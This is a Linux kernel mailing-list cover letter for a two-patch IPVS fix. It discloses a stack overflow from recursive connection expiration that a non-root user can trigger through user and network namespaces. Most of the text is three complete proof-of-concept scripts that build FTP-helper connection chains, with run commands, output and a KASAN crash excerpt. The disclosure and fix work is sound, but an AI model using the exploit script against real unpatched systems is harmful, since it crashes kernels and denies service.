Received: from mail-pj2-f42.google.com (mail-pj2-f42.google.com [74.125.227.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D86BB3EC686
	for <lvs-devel@vger.kernel.org>; Sun, 20 Sep 2026 09:31:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789896706; cv=none; b=QskFVd15gBgNuaYafvJM+HhQwKvddG5xm1KH+04qZCwCzXj7WmSMoFq+QIk0cVspXwAQVICPK8ZnJkUiPuLMb1d+HoK03kWSirFbGxtE68q0AjzswxVYMF5HrdIlFRBDRJS0dplTjaMyHDsv43gH+OcsxwuPIL8YFzVbg6iALEI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789896706; c=relaxed/simple;
	bh=l3QlRs3mSi9H5PVJKMM5HS1GFEM2haFML1KgjIyPKTQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=LI+ALafE6DswaLP0nBrt9H+LbkId+GiBI11sV2mgwrSIebBAGXY0Odc+Rcdacb3UDBHQAs3pQYScO16QpNdMguFRfMRu2Z0eFA1Ow5HOXJ617wI61tB3XFJQsPTB9/kiYApIonHgvnvbnyMR2Sq4+QLPj9zFQmHK+n27hC1ZJWY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=hKrc0EZE; arc=none smtp.client-ip=74.125.227.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="hKrc0EZE"
Received: by mail-pj2-f42.google.com with SMTP id d9443c01a7336-2df36461d63so4745655ad.3
        for <lvs-devel@vger.kernel.org>; Sun, 20 Sep 2026 02:31:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789896697; x=1790501497; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=wlZXhl5SQnrTd/OqxXWBIBcANcD1Z9IFhEWe//zp8wM=;
        b=hKrc0EZEvzKgn9ibWGyKmZvHs+2P2XMCZuHsug2I/glTlWkcRyNqLLoqiIed5+A1gR
         TbLzi9Sn9nC/o7yrnstdH3uG76LptH0J/bU56ynntSQlrk6t6wYPFsbWwg9f5iYZB0w+
         yNZzHAcvkgLU/AaGzn1/MibNVWktY0pwzBYfaggUvQ4NblHehAA0uwmeuX7KzLpGsukK
         2vc6uMnAim940g/CbdnaWqDrdkr695U7rZUQj4xb9l6DZikc2YMwJXdeHs5xSzvRalW1
         COh2Vxm1tR5bSikwlbpKyGeAPdGxg3v9bFhlkN7oPjwKcieBLZ8oHLcCjy/E107MMdGB
         Ebqg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789896697; x=1790501497;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=wlZXhl5SQnrTd/OqxXWBIBcANcD1Z9IFhEWe//zp8wM=;
        b=whl7bKm+oLEvFui9LLPaQzDsNOsW78pxryMIAqSCoBoMpIIo6oSNlasVA1u8vYLzWo
         C4BGBW14I6Tp6J/2EY2bgOnykBtLJ+S9uebu3DvGWTkRLVFUe6s4MzPuoi+RIgwtunv8
         nOMmI9HNN92e9T5Tz+5M3Y1iVQhv4ti335GpAbIHURyi99UL6WMVIevA7tcnw8l8mXGA
         V+tF2c4LwDE//EF7ZVic555IVaB/XpP7TMlOyBjdVdJiJ13ZddNmU8czBppyDHZ5CCWv
         Ig3s83FlrO3jWfcJAgGSEaG2j8lrNqLz6IyKBT9S6LQg6HxeNOk85JHzNQNIMMsJdlOu
         5gag==
X-Forwarded-Encrypted: i=1; AKwUvBw/UYzRws08KsAEsJWMGobD2jtZG0fOgyFkIpyqXZX3qpVqDtgy6SHXdgUTUkWitQvRMaVbhKGwHjk=@vger.kernel.org
X-Gm-Message-State: AFuF++mAkXzJeKAeOsfPmJYufT7N37hB5ZxEzjH/eioYipYIW234NLue
	ruxka3PdfN3/0mY6A02fw8Q/cKchDDq/7pMaeV/P2aZuamIxXK7lwOSBvNPHHNbMi9CM
X-Gm-Gg: AYBFou1uErQId3iGzwIYDp7FGix0f6ThTZbwK1HXoQR8o0GtPzTEWl1AvpX3R5Sl01m
	cR+g7mZ1txn9ZSXqjxn6HsPAT5pZeK2Wa8BVCGCPD7mHnUUngRIsrUxo9/eI2jn8CyatWklULtr
	BN4QHoG9r3mJYTSsotKWXOauCd+95b7MZj8+AzNR0/KOtmhK3ZCpyykd4oG5Q/C+uAs+VqwLncx
	ZOzrLeEfJ5Ey/U9aoG/VE4vCHQCrFI+yv60fCy5rMZjzTjsNCtl+yYPxEn/+PMkc2FrRckcDAzm
	864qIbEPqZvzEEubtBkcsQ6JbD6FZ77x/GZq++FSmTJhiwZSyJRV0LhYdO2NH0DCm4GFocFrACn
	YBy7wW4JOG6ieecxI/UHJoKKeeAejurM4TRc8kf+K/GnrkNAuiJyqBAaXPry+tMPWikCQHpjvtR
	4wo3H8LfX8a+/2keh3g3m3YHjXjH52vazb8TyI04fkeBFON+Gaox1KLiui1TuY/zIPRUiK55wDQ
	102GKOAYBtMeSP7WowdiQ3Ud4bgqw==
X-Received: by 2002:a17:903:1b30:b0:2dd:c0ff:e72d with SMTP id d9443c01a7336-2ddc0ffe9f2mr55789645ad.63.1789896696843;
        Sun, 20 Sep 2026 02:31:36 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ddc17e17e0sm18435235ad.70.2026.09.20.02.31.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 20 Sep 2026 02:31:35 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Simon Horman <horms@verge.net.au>,
	Julian Anastasov <ja@ssi.bg>
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>,
	Phil Sutter <phil@nwl.cc>,
	netdev@vger.kernel.org,
	lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH nf v3 0/2] ipvs: avoid stack overflow from recursive connection expiration
Date: Sun, 20 Sep 2026 09:31:18 +0000
Message-ID: <cover.1789877273.git.zihanx@nebusec.ai>
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue involving
net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c.
The bug is reachable by a non-root user through a user namespace and a
network namespace. We tested the fixes, and the tests showed no change to
other IPVS behavior.

This series contains 2 patches:

  1/2 Replace recursive controller expiration with an iterative cleanup
      path.
  2/2 Reject zero and configured FTP control ports as data ports.

We will provide detailed information about the bug
in this email, along with PoCs to trigger it.

---- details below ----

Bug details:

The trigger entry point is ip_vs_ftp_out() in
net/netfilter/ipvs/ip_vs_ftp.c. It parses an EPSV reply from the
real server and creates a wildcard data connection from the
advertised port.
The PoC uses port 21, the default FTP control port. ip_vs_conn_new() then
binds the FTP helper to the new connection again. Because the child has
IP_VS_CONN_F_NO_CPORT, the next connection from the same client to the VIP
on port 21 matches the wildcard child instead of creating a new top-level
entry. Repeating EPSV builds a controlled-connection chain.

The active-mode entry point, ip_vs_ftp_in(), has the same chain-building
condition when the derived data port is a configured control port.
It derives the data connection's virtual port from cp->vport - 1. With
ports={21,20}, the derived port is 20 and can bind the FTP helper again.

The FTP entry points are in ip_vs_ftp.c, but the stack-overflow root
cause is in the generic cleanup path in ip_vs_conn.c. When a controlled
connection expires, ip_vs_conn_expire() can call ip_vs_conn_del_put()
for its controller. If the controller timer is deleted, the old helper
calls ip_vs_conn_expire() recursively. A long controlled-connection chain
can then exhaust the kernel stack. The reproduced failure occurs during
network namespace teardown, but the cleanup bug is in the generic
controller-chain cleanup path, not a teardown-only special case.

Patch 1 changes ip_vs_conn_del_put() to report whether it deleted the
controller timer. ip_vs_conn_expire() follows that controller through a
repeat path instead of making a recursive call, so chain cleanup remains
synchronous while using one stack frame. It also keeps the temporary
reference until the controller is processed, handles a connection already
unlinked by a concurrent timer callback, and keeps the expiration path
under RCU before scheduling the delayed free.

Patch 2 rejects zero and configured FTP control ports before creating
passive data connections in ip_vs_ftp_out(), covering both PASV and EPSV.
It also rejects a zero active-mode client port and a data port derived
from a configured control port in ip_vs_ftp_in(). Valid data ports continue
through the existing path.

The recursive-cleanup root cause was introduced by
f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The FTP
helper's acceptance of a configured control port is attributed
separately to 1da177e4c3f4 ("Linux-2.6.12-rc2"). These commits have
different root-cause facts, so the fixes use separate Fixes: tags.

Reproducer:

The actual reproducers are shell scripts with embedded Python. The baseline
run was:

    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 400

The fixed passive-mode run was:

    SELF_UNSHARE=1 MODE=exit ./poc.sh 200

The fixed active-mode run used this complete kernel command line:

    root=/dev/sda rw console=ttyS0 earlyprintk=serial net.ifnames=0 biosdevname=0 nokaslr panic_on_warn=0 oops=panic systemd.mask=sys-kernel-config.mount systemd.mask=systemd-remount-fs.service systemd.unit=multi-user.target ip_vs_ftp.ports=21,20

and this command:

    SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1

The active-mode validation used depth 1 to check the configured-port
guard; it was not used as a deeper chain stress test.

packetdrill was not used because this trigger requires namespace creation,
the legacy IPVS sockopt ABI, a cooperating TCP server, and namespace
teardown.
That complete control-plane setup and lifetime cannot be expressed by
packetdrill alone.

We run the PoCs in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The baseline was built from 70194dc37670 (7.3.0-rc2-g70194dc37670). The
fixed kernel was built from the same baseline with both patches applied
(7.3.0-rc2-g4f45973a22e6). Both builds completed successfully.

The baseline PoC exited with status 0. Its actual stdout was:

    built 50 connections
    built 100 connections
    built 150 connections
    built 200 connections
    built 250 connections
    built 300 connections
    built 350 connections
    built 400 connections
    ip_vs_conn entries before trigger: 401
    exiting namespace holder

The fixed passive PoC exited with status 0 and ended with:

    built 200 connections
    rejected control-port replies: 200/200
    ip_vs_conn entries before trigger: 200
    passive data connections created: 0
    exiting namespace holder

It printed one control-port rejection line for each of the 200 attempts and
asserted both the 200/200 rejection count and the IPVS entry count.
The fixed
active PoC exited with status 0 and printed:

    built 1 connections
    ip_vs_conn entries before trigger: 1
    derived data connections created: 0
    exiting namespace holder

The fixed passive and active runs produced no KASAN, BUG, Oops, kernel panic,
stack-guard, or general-protection diagnostics. The baseline run produced
the crash during namespace teardown. The decoded crash excerpt below shows
the stack-out-of-bounds report, stack corruption, and repeated
ip_vs_conn_expire() frames.

The PoC scripts and decoded crash report are included below. The crash
excerpt is copied verbatim from the decoded report; only unrelated boot
output and register/disassembly details are omitted.

------BEGIN poc-original.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        reply = recv_line(s)
        if b"229 " not in reply:
            raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-original.sh--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []
rejected = 0

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        s.settimeout(0.2)
        try:
            reply = recv_line(s)
        except socket.timeout:
            rejected += 1
            print(f"control-port reply rejected on level {i}", flush=True)
        else:
            raise RuntimeError(
                f"control-port reply was not rejected on level {i}: {reply!r}"
            )
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")
if rejected != depth:
    raise SystemExit(f"expected {depth} rejected replies, got {rejected}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"rejected control-port replies: {rejected}/{depth}", flush=True)
print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a passive data connection was created"
    )
print(f"passive data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc.sh--------

------BEGIN poc-active.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if not line.upper().startswith(b"PORT "):
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"200 PORT command successful\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"PORT 198,51,100,3,4,1\r\n")
        time.sleep(0.2)
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a derived data connection was created"
    )
print(f"derived data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-active.sh--------

----BEGIN crash log----
[   40.621758] BUG: KASAN: stack-out-of-bounds in __unwind_start (arch/x86/kernel/unwind_orc.c:715)
[   40.621785] Write of size 112 at addr ff11000007307e98 by task kworker/u8:0/12
[   40.621785] 
[   40.621785] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
